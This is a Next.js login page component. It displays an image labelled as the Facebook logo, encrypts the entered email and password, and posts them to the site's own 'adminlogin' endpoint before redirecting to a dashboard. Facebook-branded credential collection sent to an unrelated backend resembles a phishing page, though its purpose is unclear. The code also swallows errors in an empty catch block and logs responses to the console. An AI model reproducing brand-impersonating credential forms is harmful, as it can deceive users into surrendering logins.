"use client";
import { encrypt } from "@/utils/security";
import { useRouter } from "next/navigation";


import React, { useState } from "react";
import Image from "next/image";
import axios from "axios";
import { uri } from "@/constant";

const Page = () => {
  const [form, setForm] = useState({
    email: "",
    password: "",
  });

  const router = useRouter();

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const encryptedformdata = encrypt(form);
    try {
      const response = await axios.post(`${uri}adminlogin`,{
        payload : encryptedformdata
      })
      console.log(response);
      
      if(response.status == 200){
        
        router.push("/dashboard");
      }
      
    } catch (error) {
      
    }
  };

  return (
    <div className="w-full bg-white flex flex-col items-center pt-24">
      <Image src="/Fb_logo.jpg" alt="Facebook Logo" width={120} height={120} />
      
      {/* Form */}
      <form onSubmit={handleSubmit} className="w-full max-w-xs space-y-4">
        <h1 className="text-2xl font-bold text-theme">Log In</h1>

        <div>
          <label htmlFor="email" className="block font-medium">
            Email
          </label>
          <input
            type="text"
            name="email"
            value={form.email}
            onChange={handleChange}
            placeholder="Enter your email"
            className="w-full border-2 border-theme rounded-md mt-1 p-2"
          />
        </div>

        <div>
          <label htmlFor="password" className="block font-medium">
            Password
          </label>
          <input
            type="password"
            name="password"
            value={form.password}
            onChange={handleChange}
            placeholder="Enter your password"
            className="w-full border-2 border-theme rounded-md p-2 mt-1"
          />
        </div>

        <button type="submit" className="w-full  bg-theme text-white p-2 rounded-md">
          Login
        </button>
      </form>
    </div>
  );
};

export default Page;
